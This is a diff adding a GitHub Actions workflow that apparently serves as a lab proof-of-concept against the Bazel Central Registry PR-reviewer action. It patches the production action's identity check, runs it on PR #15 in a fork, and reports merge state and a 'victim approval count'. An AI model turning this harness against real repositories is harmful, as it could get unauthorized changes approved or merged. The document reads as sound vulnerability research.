@@ -1,0 +1,211 @@
+name: LAB - BCR Reviewer Identity Shim
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  issues: write
+  pull-requests: write
+
+jobs:
+  review_prs:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout controlled BCR fork
+        uses: actions/checkout@v7
+        with:
+          fetch-depth: 0
+
+      - name: Safety - require only PoC PR 15
+        env:
+          GH_TOKEN: ${{ github.token }}
+          EXPECTED_HEAD: f1e298171e51b3440b8b10f32150bd62f6b660d2
+        shell: bash
+        run: |
+          set -u
+
+          OPEN_COUNT="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/pulls?state=open&per_page=100" \
+              --jq 'length'
+          )"
+
+          echo "Open PR count: $OPEN_COUNT"
+
+          if [ "$OPEN_COUNT" != "1" ]; then
+            echo "Expected exactly one open PR."
+            exit 1
+          fi
+
+          NUMBER="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/pulls?state=open&per_page=100" \
+              --jq '.[0].number'
+          )"
+
+          HEAD="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/pulls/15" \
+              --jq '.head.sha'
+          )"
+
+          AUTHOR="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/pulls/15" \
+              --jq '.user.login'
+          )"
+
+          echo "PR number: $NUMBER"
+          echo "PR author: $AUTHOR"
+          echo "PR head:   $HEAD"
+
+          if [ "$NUMBER" != "15" ]; then
+            echo "Only open PR is not #15."
+            exit 1
+          fi
+
+          if [ "$HEAD" != "$EXPECTED_HEAD" ]; then
+            echo "PR #15 HEAD changed."
+            exit 1
+          fi
+
+          if [ "$AUTHOR" != "SwayZGl1tZyyy" ]; then
+            echo "Unexpected PR author."
+            exit 1
+          fi
+
+          echo "Safety target confirmed."
+
+      - name: Checkout exact production reviewer pin
+        uses: actions/checkout@v7
+        with:
+          repository: bazelbuild/continuous-integration
+          ref: 957b0ac44549a70ccb951361b804d07d955aeb79
+          path: _lab_ci
+          fetch-depth: 1
+
+      - name: Verify pin and apply identity-only compatibility shim
+        shell: bash
+        run: |
+          set -u
+
+          EXPECTED="957b0ac44549a70ccb951361b804d07d955aeb79"
+          ACTUAL="$(git -C _lab_ci rev-parse HEAD)"
+
+          echo "Expected upstream action commit: $EXPECTED"
+          echo "Actual upstream action commit:   $ACTUAL"
+
+          if [ "$ACTUAL" != "$EXPECTED" ]; then
+            echo "Wrong upstream action revision."
+            exit 1
+          fi
+
+          python3 - <<'PY'
+          from pathlib import Path
+
+          p = Path("_lab_ci/actions/bcr-pr-reviewer/index.js")
+          data = p.read_text()
+
+          old = """  const { data } = await octokit.rest.users.getAuthenticated();
+            const myLogin = data.login.toLowerCase();"""
+
+          new = """  // LAB-ONLY compatibility shim:
+            // github.token is an installation token and cannot call GET /user.
+            // Production BCR uses BCR_PR_REVIEW_HELPER_TOKEN instead.
+            // No authorization, metadata, approval, or merge condition is changed.
+            const myLogin = 'github-actions[bot]';"""
+
+          count = data.count(old)
+
+          print(f"identity block matches: {count}")
+
+          if count != 1:
+              raise SystemExit(
+                  f"expected exactly one identity block, found {count}"
+              )
+
+          p.write_text(data.replace(old, new, 1))
+
+          print("[+] patched exactly one identity block")
+          PY
+
+          RC=$?
+
+          if [ "$RC" != "0" ]; then
+            exit "$RC"
+          fi
+
+          echo
+          echo "=================================================="
+          echo "ONLY PATCH APPLIED TO PRODUCTION ACTION"
+          echo "=================================================="
+
+          git -C _lab_ci diff -- \
+            actions/bcr-pr-reviewer/index.js
+
+          echo
+          echo "=================================================="
+          echo "PATCH STAT"
+          echo "=================================================="
+
+          git -C _lab_ci diff --stat
+
+          CHANGED="$(
+            git -C _lab_ci diff --name-only
+          )"
+
+          if [ "$CHANGED" != "actions/bcr-pr-reviewer/index.js" ]; then
+            echo "Unexpected files patched:"
+            echo "$CHANGED"
+            exit 1
+          fi
+
+      - name: Run production reviewer with lab identity shim
+        uses: ./_lab_ci/actions/bcr-pr-reviewer
+        with:
+          token: ${{ github.token }}
+          action-type: review_prs
+
+      - name: Final evidence
+        if: always()
+        env:
+          GH_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set +e
+
+          echo "=================================================="
+          echo "PR STATE"
+          echo "=================================================="
+
+          gh api "repos/$GITHUB_REPOSITORY/pulls/15" \
+            --jq '{
+              state: .state,
+              merged: .merged,
+              merged_at: .merged_at,
+              head_sha: .head.sha,
+              merge_commit_sha: .merge_commit_sha
+            }'
+
+          echo
+          echo "=================================================="
+          echo "REVIEWS"
+          echo "=================================================="
+
+          gh api \
+            "repos/$GITHUB_REPOSITORY/pulls/15/reviews?per_page=100" \
+            --jq '.[] | "\(.user.login)\t\(.state)\t\(.body)"'
+
+          echo
+          echo "=================================================="
+          echo "VICTIM APPROVAL COUNT"
+          echo "=================================================="
+
+          gh api \
+            "repos/$GITHUB_REPOSITORY/pulls/15/reviews?per_page=100" \
+            --jq '[.[] | select(
+              (.user.login | ascii_downcase) == "swayzgl1tzyy"
+              and .state == "APPROVED"
+            )] | length'
